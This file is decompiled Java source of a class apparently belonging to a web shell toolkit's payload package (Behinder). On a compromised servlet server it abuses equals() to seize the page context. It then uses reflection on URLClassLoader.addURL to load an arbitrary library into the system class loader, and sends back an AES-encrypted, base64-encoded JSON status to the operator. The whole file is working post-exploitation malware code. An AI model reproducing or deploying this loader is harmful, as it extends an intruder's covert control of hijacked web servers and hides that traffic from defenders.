// 
// Decompiled by Procyon v0.5.36
// 

package net.rebeyond.behinder.payload.java;

import java.security.Key;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import java.util.Iterator;
import java.util.List;
import javax.servlet.ServletOutputStream;
import java.lang.reflect.Method;
import java.util.Map;
import java.net.URL;
import java.net.URLClassLoader;
import java.io.File;
import java.util.HashMap;
import javax.servlet.jsp.PageContext;
import javax.servlet.http.HttpSession;
import javax.servlet.ServletResponse;
import javax.servlet.ServletRequest;

public class Loader
{
    public static String libPath;
    private ServletRequest Request;
    private ServletResponse Response;
    private HttpSession Session;
    
    @Override
    public boolean equals(final Object obj) {
        final PageContext page = (PageContext)obj;
        this.Session = page.getSession();
        this.Response = page.getResponse();
        this.Request = page.getRequest();
        final Map<String, String> result = new HashMap<String, String>();
        //兼容zcms
        if(Session.getAttribute("payload")!=null){
            Session.removeAttribute("payload");
        }
        try {
            final URL url = new File(Loader.libPath).toURI().toURL();
            final URLClassLoader urlClassLoader = (URLClassLoader)ClassLoader.getSystemClassLoader();
            final Method add = URLClassLoader.class.getDeclaredMethod("addURL", URL.class);
            add.setAccessible(true);
            add.invoke(urlClassLoader, url);
            result.put("status", "success");
        }
        catch (Exception e) {
            result.put("status", "fail");
            result.put("msg", e.getMessage());
        }
        try {
            final ServletOutputStream so = this.Response.getOutputStream();
            so.write(this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
            so.flush();
            so.close();
            page.getOut().clear();
        }
        catch (Exception e) {
            e.printStackTrace();
        }
        return true;
    }
    
    private String buildJsonArray(final List<Map<String, String>> list, final boolean encode) throws Exception {
        final StringBuilder sb = new StringBuilder();
        sb.append("[");
        for (final Map<String, String> entity : list) {
            sb.append(this.buildJson(entity, encode) + ",");
        }
        if (sb.toString().endsWith(",")) {
            sb.setLength(sb.length() - 1);
        }
        sb.append("]");
        return sb.toString();
    }
    
    private String buildJson(final Map<String, String> entity, final boolean encode) throws Exception {
        final StringBuilder sb = new StringBuilder();
        final String version = System.getProperty("java.version");
        sb.append("{");
        for (final String key : entity.keySet()) {
            sb.append("\"" + key + "\":\"");
            String value = entity.get(key).toString();
            if (encode) {
                if (version.compareTo("1.9") >= 0) {
                    this.getClass();
                    final Class Base64 = Class.forName("java.util.Base64");
                    final Object Encoder = Base64.getMethod("getEncoder", (Class[])null).invoke(Base64, (Object[])null);
                    value = (String)Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, value.getBytes("UTF-8"));
                }
                else {
                    this.getClass();
                    final Class Base64 = Class.forName("sun.misc.BASE64Encoder");
                    final Object Encoder = Base64.newInstance();
                    value = (String)Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, value.getBytes("UTF-8"));
                    value = value.replace("\n", "").replace("\r", "");
                }
            }
            sb.append(value);
            sb.append("\",");
        }
        if (sb.toString().endsWith(",")) {
            sb.setLength(sb.length() - 1);
        }
        sb.append("}");
        return sb.toString();
    }
    
    private byte[] Encrypt(final byte[] bs) throws Exception {
        final Object custmKeyObj = this.Request.getAttribute("parameters");
        final String key = (custmKeyObj!=null&&custmKeyObj instanceof String) ? custmKeyObj.toString():this.Session.getAttribute("u").toString();
        final byte[] raw = key.getBytes("utf-8");
        final SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
        final Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
        cipher.init(1, skeySpec);
        final byte[] encrypted = cipher.doFinal(bs);
        return encrypted;
    }
}
